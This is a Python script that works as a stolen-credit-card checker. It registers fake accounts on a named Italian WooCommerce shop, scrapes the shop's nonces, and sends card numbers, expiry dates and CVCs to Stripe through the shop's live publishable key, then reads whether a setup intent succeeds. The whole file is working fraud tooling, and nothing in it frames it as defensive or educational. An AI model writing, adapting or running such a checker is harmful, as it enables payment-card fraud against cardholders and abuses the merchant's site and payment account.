import requests
import random
import string
import re
import user_agent

def Tele(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    # Remove "20" prefix from the year if present
    if "20" in yy:
        yy = yy.split("20")[1]

    user = user_agent.generate_user_agent()
    r = requests.session()

    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"

    acc = generate_random_account()

    def generate_username():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=20))
        return f"{name}{number}"

    username = generate_username()

    def generate_random_code(length=32):
        letters_and_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_and_digits) for _ in range(length))

    corr = generate_random_code()
    sess = generate_random_code()

    headers = {
        'user-agent': user,
    }

    response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)
    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

    data = {
        'email': acc,
        'password': 'ASDzxc#123#',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
        'wc_order_attribution_session_start_time': '2024-10-17 14:07:30',
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user,
        'mailchimp_woocommerce_newsletter': '1',
        'woocommerce-register-nonce': register,
        '_wp_http_referer': '/my-account/',
        'register': 'Registrati',
    }

    response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)

    response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
    nonce = re.findall(r'"add_card_nonce":"(.*?)"', response.text)[0]

    data = f'type=card&billing_details[name]=+&billing_details[email]=iegeodftomeppqjdgk%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    if 'id' not in response.json():
        print('ERROR CARD')
    else:
        id = response.json()['id']

    headers = {
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }

    data = {
        'stripe_source_id': id,
        'nonce': nonce,
    }

    response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
    return response.json()
